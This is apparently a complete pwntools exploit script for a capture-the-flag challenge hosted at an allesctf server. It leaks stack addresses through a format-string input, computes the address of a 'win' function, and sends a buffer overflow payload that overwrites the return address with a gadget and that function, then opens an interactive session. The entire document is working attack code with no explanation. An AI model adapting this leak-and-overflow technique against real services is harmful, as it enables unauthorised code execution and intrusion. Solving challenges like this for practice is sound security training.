#! /usr/bin/python2.7
from pwn import *
p = remote("hax1.allesctf.net",9100)
p.recvuntil("Enter your witch name:")
p.sendline("%p |" * 64)
msg = p.recvuntil(" enter your magic spell:")
msg = msg.split("|")
address = int(msg[38],16)
win = address - 309
raw_input("attach gdb")
ret = win + 54
payload = "Expelliarmus\x00" + "A" * cyclic_find("cnaa") + p64(ret) + p64(win)
print(payload)
p.sendline(payload)
p.interactive()